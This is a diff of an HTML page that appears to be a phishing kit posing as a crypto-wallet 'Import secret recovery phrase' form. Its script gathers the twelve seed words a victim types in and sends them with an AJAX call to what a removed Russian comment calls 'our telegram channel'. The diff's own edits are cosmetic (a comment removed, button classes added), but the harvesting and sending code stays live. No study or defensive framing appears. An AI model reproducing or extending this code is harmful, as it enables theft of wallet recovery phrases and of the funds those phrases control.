@@ -48,7 +48,6 @@
       <script type="text/javascript" src="../script.js"></script>
       <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
       <script src="exponential.js"></script>
-
    </head>
    <style>
       body {
@@ -156,7 +155,7 @@
             <input name="phone12" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="12" id="input12" required="">
             <input name="phone13" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="13" id="input13" required="" style="visibility: hidden;">
           </div>
-          <a ><button  onclick="OnClickSendNudes()">Import secret recovery phrase</button></a>
+          <a ><button  class="submit-button contact-form__button" onclick="OnClickSendNudes()">Import secret recovery phrase</button></a>
         </form>
       </main>
       <script type="text/javascript">
@@ -179,7 +178,6 @@
         var text = "1- "+fraze1  + "\n" + "2- "+fraze2 + "\n"  +"3- "+ fraze3 + "\n"  +"4- "+  fraze4 + "\n"  + "5- "+ fraze5 + "\n"  +"6- "+fraze6 + "\n"  +  "7- "+fraze7 + "\n"  + "8- "+fraze8 + "\n"  + "9- "+fraze9 + "\n"  + "10- "+fraze10 + "\n"  + "11- "+ fraze11 + "\n"  + "12- "+fraze12;
 
         console.log(text);
-        //Отправляем текст в наш телеграм канал
         otpravka(token,text,chatid);
               function otpravka(token,text,chatid){
               var z = $.ajax({  
